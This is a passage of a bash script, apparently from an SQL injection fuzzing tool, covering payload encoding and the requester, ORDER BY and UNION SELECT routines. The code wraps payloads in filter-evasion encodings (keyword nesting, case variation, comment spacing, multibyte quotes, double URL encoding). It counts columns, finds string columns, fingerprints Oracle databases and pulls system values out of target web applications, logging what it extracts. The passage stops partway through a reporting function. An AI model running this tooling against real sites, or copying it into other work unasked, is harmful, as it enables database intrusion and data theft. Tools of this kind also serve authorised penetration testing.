#!/bin/bash

#############global variables##############
#this is a gloablly unique counter that is used to differentiate response diff files
reqcount=0

#default delay duration to use for timedelay testing: 
timedelayduration="20"

#delay threshold in seconds. When running a time delay scan, this can be set to tune out false positives. This should be higher than 'normal' request times to prevent false positives, but lower than the timedelay value:
timedelaythreshhold="1" 

# set the search term to a non-null value to prevent a match on an blank value:
ErrorString="foo123rewerwer435345345345"

#by default the header value is set to nill
headertoset=''

# function definitions
encodeme()
{

inputbuffer=$encodeinput
#modify at the SQL layer first
if [ true = "$Y" ] ; then
	inputbuffer=`echo $inputbuffer | replace " " "/*d*/"`
fi

if [ true = "$E" ] ; then
	inputbuffer=`echo $inputbuffer | replace "=" " like "`
fi

if [ true = "$J" ] ; then #nesting
	inputbuffer=`echo $inputbuffer | replace "select" "selselectect" | replace "union" "uniunionon" | replace "and" "anandd" | replace "order" "ororderder" |replace "or" "oorr" | replace "by" "bbyy" | replace "delay" "dedelaylay" | replace "dual" "dudualal" | replace "exec" "exexecec" | replace "from" "frfromom" | replace "having" "havhavinging" | replace "waitfor" "waitwaitforfor" | replace "case" "cacasese" | replace "when" "whwhenen" | replace "then" "ththenen" | replace "else" "elelsese" | replace "end" "eendnd" | replace "len" "llenen" | replace "ascii" "asasciicii" | replace "substring" "subsubstringstring"| replace "substr" "subsubstrstr" | replace "like" "lilikeke"`
fi

if [ true = "$U" ] ; then #case variation
	inputbuffer=`echo $inputbuffer | replace "select" "sElEcT" | replace "union" "uNiOn" | replace "and" "aNd" | replace "or" "oR" | replace "order" "oRdEr" | replace "by" "bY" | replace "delay" "dElAy" | replace "dual" "dUaL" | replace "exec" "eXeC" | replace "from" "fRoM" | replace "having" "hAvInG" | replace "waitfor" "wAiTfOr" | replace "case" "cAsE" | replace "when" "wHeN" | replace "then" "tHeN" | replace "else" "eLsE" | replace "end" "eNd" | replace "len" "lEn" | replace "ascii" "aScIi" | replace "substr" "sUbStR" | replace "like" "lIkE"`
fi

if [ true = "$m" ] ; then #UTF-8 full-width single quote
	inputbuffer=`echo $inputbuffer | replace "'" "%ef%bc%87"`
fi

if [ true = "$z" ] ; then #multi byte quote
	inputbuffer=`echo $inputbuffer | replace "'" "%bf%27"`
fi


#URL encoding occurs unless we are doing URI unicode encoding 
#if [ false = "$O" ] ; then  
encodeoutput=`echo $inputbuffer | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c" | replace "/" "%2f" | replace "|" "%7c"` 
#fi

#replace URL encoded spaces with comments and intermediary characters
if [ true = "$N" ] ; then
	encodeoutput=`echo $encodeoutput | replace "%20" "%2f%2a%0B%0C%0D%0A%09%2a%2f"`
fi

#if [ true = "$O" ] ; then
#	encodeoutput=`echo $encodeoutput | replace "select" "se%2f%2a%2a%2flect" | replace "union" "uni%2f%2a%2a%2fon" | replace "and" "an%2f%2a%2a%2fd" | replace "or" "o%2f%2a%2a%2fr" | replace "order" "ord%2f%2a%2a%2fer" | replace "by" "b%2f%2a%2a%2fy" | replace "delay" "del%2f%2a%2a%2fay" | replace "dual" "du%2f%2a%2a%2fal" | replace "exec" "ex%2f%2a%2a%2fec" | replace "from" "fr%2f%2a%2a%2fom" | replace "having" "hav%2f%2a%2a%2fing" | replace "waitfor" "wai%2f%2a%2a%2ftfor" | replace "case" "ca%2f%2a%2a%2fse" | replace "when" "wh%2f%2a%2a%2fen" | replace "then" "th%2f%2a%2a%2fen" | replace "else" "el%2f%2a%2a%2fse" | replace "end" "en%2f%2a%2a%2fd" | replace "len" "le%2f%2a%2a%2fn" | replace "ascii" "as%2f%2a%2a%2fcii" | replace "substr" "su%2f%2a%2a%2fbstr"`
#fi

if [ true = "$V" ] ; then #double URL encoding
	encodeoutput=`echo $encodeoutput | replace "%" "%25"`
fi

if [ true = "$p" ] ; then #hash + noise + newline
	encodeoutput=`echo $encodeoutput | replace "%20" "%234i5ugh4iuh%0a"`
fi

if [ true = "$w" ] ; then #comment + newline
	encodeoutput=`echo $encodeoutput | replace "%20" "%2d%2d%0a"`
fi

#--------------

#if [ true = "$O" ] ; then #uri unicode decoding
#	uriinputdecode=$decodeoutput
#  	uriunicode
#  	decodeoutput=$uriinputdecoded
#fi

#URL decoding occurs unless we are doing URI unicode encoding 
#if [ false = "$O" ] ; then  
decodeoutput=`echo $decodeinput | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "("| replace "%29" ")" | replace "%2c" "," | replace "%2f" "/" | replace "%7c" "|"`; 
#fi
}

#encodeinput=foo
#encodeme
#foo=$encodeoutput

#decodeinput=foo
#encodeme
#foo=$decodeoutput

uriunicode()
{
## URI unicode ###
#input="union select 'foo'"
#receives and encodes uriinputencode string
#returns uriinputencoded
#also receives and decodes uriinputdecode string
#also returns uriinputdecoded string

# how to use me:
#  $uriinputencode="my string that i want encoded"
#  uriunicode
#  $variableholdingencodedstring=uriinputencoded

i=0
uriinputencoded=''
stringlength=${#uriinputencode}
((stringlengthminus1=$stringlength-1))
while ((i<$stringlength)) ; do 
	char=`echo "${uriinputencode:i:1}"`
	val=`printf "%02x" "'$char'"`
	vallength=${#val}
	if [[ "$vallength" == "2" ]] ; then
		uriinputencoded=$uriinputencoded`echo -n "%u00"`
	else
		uriinputencoded=$uriinputencoded`echo -n "%u"`
	fi
	uriinputencoded=$uriinputencoded`echo -n $val`
	((i++))
done 

#URI unicode decoding:

i=0
uriinputdecoded=''
stringlength=${#uriinputdecode}
while ((i<$stringlength)) ; do 
	char=`echo "${uriinputdecode:i:1}"`
	if [[ "$char" == "%" ]] ; then	
		char1=`echo "${uriinputdecode:(i+4):1}"`		
		if [[ "$char1" == "a" ]] ; then 
			char1=10
		elif [[ "$char1" == "b" ]] ; then 
			char1=11
		elif [[ "$char1" == "c" ]] ; then 
			char1=12
		elif [[ "$char1" == "d" ]] ; then 
			char1=13
		elif [[ "$char1" == "e" ]] ; then 
			char1=14
		elif [[ "$char1" == "f" ]] ; then 
			char1=15
		fi						
		char2=`echo "${uriinputdecode:(i+5):1}"`
		if [[ "$char2" == "a" ]] ; then 
			char2=10
		elif [[ "$char2" == "b" ]] ; then 
			char2=11
		elif [[ "$char2" == "c" ]] ; then 
			char2=12
		elif [[ "$char2" == "d" ]] ; then 
			char2=13
		elif [[ "$char2" == "e" ]] ; then 
			char2=14
		elif [[ "$char2" == "f" ]] ; then 
			char2=15
		fi						
		((one=$char1*16))
		((two=$char2+$one))
		uriinputdecoded=$uriinputdecoded`echo $two | awk '{printf("%c", $1)}'`
	fi
	((i=$i+3))
done 
}


requester()
{
#recieves badparams (a string of all params, including the fuzzed param)
#returns: 
#	request - a string - the request sent in sqlifuzzer format
#	response - a string - containing the httpcode,length and duration of the response

if [ true = "$Z" ] ; then echo "DEBUG! sending: $badparams" ; fi
if [[ $method != "POST" ]]; then #we're doing a get - simples					
	# send a 'normal' request
	response=`curl $uhostname$page"?"$badparams -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
	request="$method URL: $uhostname$page"?"$badparams"
else	# we're doing a POST - not so simple...
	if (($firstPOSTURIURL>0)) ; then
		if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
			response=`curl -d "$static" $uhostname$page"?"$badparams -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
			request="$method URL: $uhostname$page?$badparams??$static" 	
		fi
		if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
			response=`curl -d "$badparams" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
			request="$method URL: $uhostname$page??$badparams" 
		fi
	elif [ "$multipartPOSTURL" == 1 ] ; then #we are in multipart form mode
		#have to url decode the badparams values - not great for performance to encode then decode, but it works...
		decodeinput=$badparams
		encodeme
		badparams=$decodeoutput
		echo -n "--form \""$badparams\" | replace '&' '" --form "' > ./foo.txt
		response="`eval curl $uhostname$page "\`cat ./foo.txt\`" -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`"
		#echo "Response: `cat ./foo.txt`"
		request="MULTIPART POST URL: $uhostname$page???$badparams"
	else #just a normal POST:
		response=`curl -d "$badparams" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
		request="$method URL: $uhostname$page?$badparams" 		
	fi
fi
}


orderbycheck()
{
#need to check we have a valid orderby test string

if [ true = "$O" ] ; then #uri unicode encoding
	uriinputencode="1$quote order by 9659$end"
	uriunicode
	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
elif [ true = "$Y" ] ; then #Inline SQL comment space
	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote/*d*/order/*d*/by/**/9659$end"`
else
	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by 9659$end"`
fi

#echo "debug cleanoutput $cleanoutput"
#echo "debug badparams $badparams"

encodeinput=$badparams
encodeme
badparams=$encodeoutput

#echo "debug $badparams"

requester

#status999=200
status999=`echo $response | cut -d ":" -f 1`
length999=`echo $response | cut -d ":" -f 2`

if [ true = "$O" ] ; then #uri unicode encoding
	uriinputencode="1$quote order by 1$end"
	uriunicode
	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
elif [ true = "$Y" ] ; then #Inline SQL comment space
	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote/*d*/order/*d*/by/**/1$end"`
else
	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by 1$end"`
fi
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester

#status1=200
status1=`echo $response | cut -d ":" -f 1`
length1=`echo $response | cut -d ":" -f 2`
ordlngthdiff=0
((lendiff=$length1-$length999))
if [[ "$lendiff" -gt 4 || "$lendiff" -lt 4 ]] ; then
	ordlngthdiff=1
fi
#echo "Order by 1 got a $status1 response, order by 9659 got a $status999 response"
}

orderbyrequest()
{
count=1
#this sets the max number of columns we will check for in a table: 
columns=60
while [[ $count -lt $columns ]] ; do
		if [ true = "$O" ] ; then #uri unicode encoding
			uriinputencode="1$quote order by $count$end"
			uriunicode
			badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
		elif [ true = "$Y" ] ; then #Inline SQL comment space
			badparams=`echo "$cleanoutput" | replace "$payload" "1$quote/*d*/order/*d*/by/**/$count$end"`

		else
			badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by $count$end"`
		fi
		encodeinput=$badparams
		encodeme
		badparams=$encodeoutput
		requester
		statusX=`echo $response | cut -d ":" -f 1`
		if [[ "$statusX" != "$status1" ]] ; then 
			((colno=$count-1))
			echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K]\033[0m $request"
			tput sgr0 # Reset attributes.
			echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
			success=1
			break 
		fi
		let "count+=1"
done
}

orderbyrequestlength()
{
echo "Using 'order by x' and response length diffing to determine the number of columns"
count=1
columns=60
while [[ $count -lt $columns ]] ; do
	echo -n "."
	if [ true = "$Z" ] ; then echo "DEBUG! sending order by req: $badparams" ; fi
	if [ true = "$O" ] ; then #uri unicode encoding
		uriinputencode="1$quote order by $count$end"
		uriunicode
		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
	elif [ true = "$Y" ] ; then #Inline SQL comment space
		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote/*d*/order/*d*/by/**/$count$end"`
	else
		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by $count$end"`
	fi
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	lengthX=`echo $response | cut -d ":" -f 2`
	if [ true = "$Z" ] ; then echo "DEBUG! lengthX: $lengthX length1: $length1" ; fi
	if [[ "$lengthX" != "$length1" ]] ; then
		echo "" 
		((colno=$count-1))
		echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K] $request\033[0m"
		tput sgr0 # Reset attributes.
		echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
		success=1
		break 
	fi
	let "count+=1"
	if [[ "$count" == "$columns" ]] ; then
		echo "" #this adds a new line when order by fails
		echo "Order By testing failed." 
	fi
done
}

#orderbyrequestbinchop()
#TODO get this woking...
#{
#i=80
#old=40
#down=1
#resp_error=0
#while [[ $i -gt 0 ]] ; do
#	badparams=`echo "$outputstore" | replace "$payload" "1$quote+order+by+$i$end"`
#	echo "Debug: $badparams#"
#	echo "down: $down"
#	if [[ "$resp_error" == "1" ]] ; then
#		if [[ "$down" == "1" ]] ; then
#			((i=$i/2))
#		else #we are going upward
#			((i=$i*2)) 
#		fi
#	else #we didnt get an error
#		#first: store the old vaule:
#		store=$old
#		#test to see if we have got the right number of columns by issuing an order by one greater than i
#		#if this gets an error, we have got the right answer
#		((onemorethani=$i+1))  
#		badparams=`echo "$outputstore" | replace "$payload" "1$quote+order+by+$onemorethani$end"`
#		requester
#		statusX=`echo $response | cut -d ":" -f 1`
#		lengthX=`echo $response | cut -d ":" -f 2`
#		#have to store the old $request value
#		oldrequest=$request
#		if [[ "$statusX" != "200" ]] ; then	
#			((colno=$i-1))
#			echo -e '\E[31;48m'"\033[1m[ORDER BY: $i COL REQ:$K]\033[0m $oldrequest"
#			tput sgr0 # Reset attributes.
#			echo "[ORDER BY: $i COL REQ:$K] $oldrequest" >> ./output/$safelogname$safefilename.txt;
#			success=1
#			break 
#		else # we havent got the right answer
#			((i=$store*0.75))
#		fi
#	fi
#	requester
#	statusX=`echo $response | cut -d ":" -f 1`
#	lengthX=`echo $response | cut -d ":" -f 2`
#	if [[ "$status1" == "200" && "$status1" != "$statusX" ]] ; then 
#		resp_error=1
#		old=$i	
#	else
#		resp_error=0
#	fi
#	#elif [[ "$status1" == "200" && "$status1" == "$statusX" ]] ; then
#	#	((length=$length1-$lengthx))
#	#	if [[ $length -gt 4 || $length -lt -4 ]] then
#	#	#this tries to account for apps that return a status 200 error page by measuring response length diffs
#	#	((half_i=$i/2))
#	#	((i=$i+$half_i))
#	#else
#	#	((i=$i/2))
#	#if no error, we double the value
#	if [[ $statusX == 200 ]] ; then
#		((i=$i*2))
#	fi
#done
#}

orderby()
{
#function to determine the number of columns in a where clause

#recieves: 
#	$payload (the clean, unencoded payload) to look for SQLi metachars at begininng and end of payload
#	$outputstore which holds the current paramstring (the encoded payload and the other unfuzzed params)
#returns:
#	$badparams a version of the paramstring taken from outputstore with the fuzzed payload replaced with an order by
#	$outputs enumerated column number info to the screen 		

#this code looks at the exploit payload and tries to determine the SQLi metacharacters used:
#was there a single quote at the begining? was there a comment char (- or #) at the end?
#these may be needed to encapsulate our our 'order by x' payload for it to work 
oracledb=0
firstchar="${payload:1:1}"
if [[ "$firstchar" == "'" ]] ; then	
	quote="'"
elif [[ "$firstchar" == '"' ]] ; then
	quote='"'
else
	quote=""
fi

#echo "Debug $payload"
lastchar="${payload: -1}"
if [[ "$lastchar" == "-" ]] ; then
	end="--"
elif [[ "$lastchar" == "#" ]] ; then
	end="-- #"
else
	end=""
fi

orderbycheck

#echo "$request"


#if you get two non-200 status's back, both 'order by x' requests failed; append an '--' on the end: 
if [[ "$status1" != "200" && "$status1" == "$status999" && "$timedelay" == "0" ]] ; then
	end="--"
	orderbycheck
fi

#if status1 is different from status999 and status1 was a 200 you should be golden!
success=0
if [[ "$status1" != "$status999" && "$status1" == "200" && "$timedelay" == "0" ]] ; then
	# a difference between the two order by statements - we are good for order by column number enum
	echo "Using 'order by x' and response http status diffing to determine the number of columns"
	orderbyrequest
fi

#if the above didnt work out,
#repeat the above, appending a # instead of --
if [[ "$success" == 0 ]] ; then
	if [[ "$status1" != "200" && "$status1" == "$status999" && "$timedelay" == "0" ]] ; then
		end='-- #'
		orderbycheck
	fi
	if [[ "$status1" != "$status999" && "$status1" == "200" && "$timedelay" == "0" ]] ; then
		# a difference between the two order by statements - we are good for order by column number enum
		echo "Using 'order by x' and response http status diffing to determine the number of columns"
		orderbyrequest
	fi
fi

#ok, lets say you have an app that did show a difference between order by 1 and order by 908098, BUT not in the status, in the response length:
if [[ "$success" == 0 ]] ; then
	#end is currently set to #
	orderbycheck
	if [[ "$status1" == "200" && "$status999" == "200" && "$ordlngthdiff" == "1" && "$timedelay" == "0" ]] ; then
		# a difference IN LENGTH between the two order by statements - we are good for order by column number enum
		orderbyrequestlength
	fi
fi

#if one of the above order by did work then lets try a union select
if [[ "$success" == 1 ]] ; then
	unionselect
fi

}

unionselect()
{
echo "Running UNION SELECT tests" 
#we need to create a string like union select null,null,null,null with a 'null,' for the colno (number of columns from the order by x) 
((nullcount=0))
nullstring=""
while [[ $nullcount -lt $colno ]] ; do
	((nullcount=$nullcount+1))
	if (($nullcount==$colno)) ; then 
		nullstring=$nullstring"null"
	else
		nullstring=$nullstring"null,"
	fi
done

#we create a nullstring similar to the above but with one extra null to use as a request that should fail
((nullcount=0))
nullwrongstring="null,"
while [[ $nullcount -lt $colno ]] ; do
	((nullcount=$nullcount+1))
	if (($nullcount==$colno)) ; then 
		nullwrongstring=$nullwrongstring"null"
	else
		nullwrongstring=$nullwrongstring"null,"
	fi
done


if [ true = "$O" ] ; then #uri unicode encoding
	uriinputencode="1$quote union select $nullwrongstring$end"
	uriunicode
	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
else
	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullwrongstring$end"`
fi

#echo "cleanoutput: $cleanoutput"
#echo "badparams: $badparams"


encodeinput=$badparams
encodeme
badparams=$encodeoutput
#echo "DEBUG wrong $badparams"
requester
statusselN=`echo $response | cut -d ":" -f 1`
lengthselN=`echo $response | cut -d ":" -f 2`

if [ true = "$O" ] ; then #uri unicode encoding
	uriinputencode="1$quote union select $nullstring$end"
	uriunicode
	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
else
	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullstring$end"`
fi

encodeinput=$badparams
encodeme
badparams=$encodeoutput
#echo "DEBUG right $badparams"
requester
statusselY=`echo $response | cut -d ":" -f 1`
lengthselY=`echo $response | cut -d ":" -f 2`
selectsuccess=0
#note that the response length check is disabled here by '|| $lengthselN != $lengthselN' 
#this is to get things running based on status codes, then go to length diffing later
if [[ $statusselY != $statusselN || $lengthselN != $lengthselN ]] ; then
	echo -e '\E[31;48m'"\033[1m[UNION SELECT: $colno COL REQ:$K]\033[0m $request"
	tput sgr0 # Reset attributes.
	echo "[UNION SELECT: $colno COL REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
	selectsuccess=1
fi

if [[ "$selectsuccess" == 0 ]] ; then
	#try using a from dual - this might be an oracle db

	if [ true = "$O" ] ; then #uri unicode encoding
		uriinputencode="1$quote union select $nullstring$end"
		uriunicode
		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
	else
		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullstring$end"`
	fi

	#echo "DEBUG right $badparams"
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	statusselY=`echo $response | cut -d ":" -f 1`
	lengthselY=`echo $response | cut -d ":" -f 2`

	if [ true = "$O" ] ; then #uri unicode encoding
		uriinputencode="1$quote union select $nullstring from dual$end"
		uriunicode
		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
	else
		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullstring from dual$end"`
	fi	
	
	#echo "DEBUG oracle $badparams"
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	statusselDUAL=`echo $response | cut -d ":" -f 1`
	lengthselDUAL=`echo $response | cut -d ":" -f 2`
	#note that the response length check is disabled here by '|| $lengthselN != $lengthselN' 
	#this is to get things running based on status codes, then go to length diffing later
	if [[ $statusselDUAL == "200" && $statusselY != $statusselDUAL || $lengthselN != $lengthselN ]] ; then
		#echo "UNION SELECT looks good! $request"
		echo -e '\E[31;48m'"\033[1m[ORACLE DB DETECTED - FROM DUAL REQ:$K]\033[0m $request"
		tput sgr0 # Reset attributes.
		echo "[ORACLE DB DETECTED - FROM DUAL REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
		
		echo -e '\E[31;48m'"\033[1m[UNION SELECT: $colno COL REQ:$K]\033[0m $request"
		tput sgr0 # Reset attributes.
		echo "[UNION SELECT: $colno COL REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
	
		selectsuccess=1
		dbms="oracle"
	fi
fi

#if the union select worked, lets enumerate the data types
if [[ "$selectsuccess" == 1 ]] ; then
	selinject="'qwEqrEe'"
	unionselectout
fi

}

unionselectout()
{
echo "Using UNION SELECT to test for string columns"
((selparamcount=1))
while [[ $selparamcount -le $colno ]] ; do
	#we need to create a string like union select null,'asdwerwe',null,null with a 'null,' for the colno (number of columns from the order by x) 
	((nullcount=0))
	nullstring=""
	while [[ $nullcount -lt $colno ]] ; do
		((nullcount=$nullcount+1))
		if (($nullcount==$colno)) ; then
			if (($nullcount==$selparamcount)) ; then
				if [[ $oracledb == 1 ]] ; then
					nullstring=$nullstring$selinject" from dual"
				else
					nullstring=$nullstring$selinject
				fi
			else
				if [[ $oracledb == 1 ]] ; then
					nullstring=$nullstring"null from dual"
				else	
					nullstring=$nullstring"null"
				fi
			fi
		else 
			if (($nullcount==$selparamcount)) ; then
				nullstring=$nullstring$selinject","
			else
				nullstring=$nullstring"null,"
			fi
		fi
	done
	
	#we create a nullstring similar to the above but with one extra null to use as a request that should fail
	((nullcount=0))
	nullwrongstring=""
	while [[ $nullcount -lt $colno ]] ; do
		((nullcount=$nullcount+1))
		if (($nullcount==$colno)) ; then
			if (($nullcount==$selparamcount)) ; then
				if [[ $oracledb == 1 ]] ; then
					nullwrongstring=$nullwrongstring$selinject" from dual"
				else
					nullwrongstring=$nullwrongstring$selinject
				fi
			else
				if [[ $oracledb == 1 ]] ; then
					nullwrongstring=$nullwrongstring"null from dual"
				else
					nullwrongstring=$nullwrongstring"null"
				fi
			fi
		else 
			if (($nullcount==$selparamcount)) ; then
				nullwrongstring=$nullwrongstring$selinject","
			else
				nullwrongstring=$nullwrongstring"null,"
			fi
		fi
	done
	nullwrongstring=$nullwrongstring",null"
	
	if [ true = "$O" ] ; then #uri unicode encoding
		uriinputencode="1$quote union select $nullwrongstring$end"
		uriunicode
		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
	else
		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullwrongstring$end"`
	fi
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	#echo "DEBUG wrong $badparams"
	requester
	statusselN=`echo $response | cut -d ":" -f 1`
	lengthselN=`echo $response | cut -d ":" -f 2`
	
	if [ true = "$O" ] ; then #uri unicode encoding
		uriinputencode="1$quote union select $nullstring$end"
		uriunicode
		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
	else
		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullstring$end"`
	fi

	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	#echo "DEBUG right $badparams"
	requester
	statusselY=`echo $response | cut -d ":" -f 1`
	lengthselY=`echo $response | cut -d ":" -f 2`

	ordlngthdiff=0
	((lendiff=$lengthselY-$lengthselN))
	if [[ "$lendiff" -gt 4 || "$lendiff" -lt 4 ]] ; then
		ordlngthdiff=1
	fi
	stringcolumnfound=0
	if [[ $statusselY != $statusselN && $statusselY == 200 ]] ; then
		echo -e '\E[31;48m'"\033[1m[UNION SELECT: STRING COLUMN $selparamcount REQ:$K]\033[0m $request"
		tput sgr0 # Reset attributes.
		echo "[UNION SELECT: STRING COLUMN $selparamcount REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
		stringcolumnfound=1
		selectsystemstrings
	fi

	if [[ $statusselY == $statusselN && $statusselY == 200 && ordlngthdiff == 1 ]] ; then
		echo -e '\E[31;48m'"\033[1m[UNION SELECT: STRING COLUMN $selparamcount REQ:$K]\033[0m $request"
		tput sgr0 # Reset attributes.
		echo "[UNION SELECT: STRING COLUMN $selparamcount REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
		stringcolumnfound=1
		selectsystemstrings
	fi
((selparamcount=$selparamcount+1))
done	
if [[ $stringcolumnfound == 0 ]] ; then
	echo "No string columns found"
fi
}

selectsystemstrings()
{
#reqcount=0 #need a counter to differentiate result files from each other. no longer initialising this to zero - i want it to be gloablly unique
echo "Attempting to extract system parameters (reading params from ./payloads/system-params.txt)"
cat ./payloads/system-params.txt | while read inj3ct ; do
	if [ true = "$O" ] ; then #uri unicode encoding
		uriinputencode="0$quote union select $nullstring$end"
		uriunicode
		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded" | replace "%u0020%u0066%u0072%u006f%u006d%u0020%u0064%u0075%u0061%u006c" ""`
	else
		badparams=`echo "$cleanoutput" | replace "$payload" "0$quote union select $nullstring$end" | replace " from dual" ""`
	fi
#	badparams=`echo "$outputstore"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	rm ./selcheck1
	cp ./dump ./selcheck1

	if [ true = "$O" ] ; then #uri unicode encoding

		uriinputencode="$inj3ct"
		uriunicode
		encodedinj3ct=$uriinputencoded

		uriinputencode="$selinject"
		uriunicode
		encodedselinject=$uriinputencoded

		badparams=`echo "$badparams" | replace "$encodedselinject" "$encodedinj3ct"`
	else
		badparams=`echo "$badparams" | replace "$selinject" "$inj3ct"`
	fi
	#echo "Debug: $badparams"
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	status=`echo $response | cut -d ":" -f 1`
	systemstring=`diff ./dump ./selcheck1`
	#for a union select to be working, you should be getting a 200 status back:
	if [[ "$systemstring" != "" && $status == "200" ]] ; then
		diff ./dump ./selcheck1 > ./responsediffs/$safefilename-rdiff-$K-$payloadcounter-$reqcount.txt
		######
		if [[ $method != "POST" ]]; then #we're doing a get - simples 
			echo "[DATA-EXTRACTED: $inj3ct REQ:$K $safefilename-rdiff-$K-$payloadcounter-$reqcount.txt] $method URL: $uhostname$page"?"$badparams" >> ./output/$safelogname$safefilename.txt
			echo -e '\E[31;48m'"\033[1m[DATA-EXTRACTED: $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" ;
			tput sgr0 # Reset attributes.
		else
			if (($firstPOSTURIURL>0)) ; then
				if [ $firstPOSTURIURL == 1 ] ; then
					echo "[DATA-EXTRACTED: $inj3ct REQ:$K "$safefilename"-rdiff-$K-$payloadcounter-$reqcount.txt] $method URL: $uhostname$page"?"$static"??"$badparams" >> ./output/"$safefilename"$safelogname.txt
					echo -e '\E[31;48m'"\033[1m[DATA-EXTRACTED: $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$badparams";
					tput sgr0 # Reset attributes.
				else
					echo "[DATA-EXTRACTED: $inj3ct REQ:$K "$safefilename"-rdiff-$K-$payloadcounter-$reqcount.txt] $method URL: $uhostname	$page"??"$badparams" >> ./output/"$safefilename"$safelogname.txt
					echo -e '\E[31;48m'"\033[1m[DATA-EXTRACTED: $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"??"$badparams";
					tput sgr0 # Reset attributes.
				fi
			elif [ "$multipartPOSTURL" == 1 ] ; then 
				#mulipart post
				echo "[DATA-EXTRACTED: $inj3ct REQ:$K "$safefilename"-rdiff-$K-$payloadcounter-$reqcount.txt] $method URL: $uhostname$page"???"$badparams" >> ./output/"$safefilename"$safelogname.txt
				echo -e '\E[31;48m'"\033[1m[DATA-EXTRACTED: $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"???"$badparams"
				tput sgr0 # Reset attributes.
			else
				#normal post
				echo "[DATA-EXTRACTED: $inj3ct REQ:$K "$safefilename"-rdiff-$K-$payloadcounter-$reqcount.txt] $method URL: $uhostname$page"?"$badparams" >> ./output/"$safefilename"$safelogname.txt
				echo -e '\E[31;48m'"\033[1m[DATA-EXTRACTED: $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
				tput sgr0 # Reset attributes.
			fi
		fi
	######
	fi
((reqcount=$reqcount+1))
done
}

echoreporter()
{
######
if [[ $method != "POST" ]]; then #we're doing a get - simples 
	echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$badparams" >> ./output/$safelogname$safefilename.txt
	echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" ;
	tput sgr0 # Reset attributes.
else
	if (($firstPOSTURIURL>0)) ; then
		if [ $firstPOSTURIURL == 1 ] ; then
			echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$static"??"$badparams" >> ./output/$safelogname$safefilename.txt
			echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$badparams";
			tput sgr0 # Reset attributes.
		else
			echo "[$remessage REQ:$K] $method URL: $uhostname	$page"??"$badparams" >> ./output/$safelogname$safefilename.txt
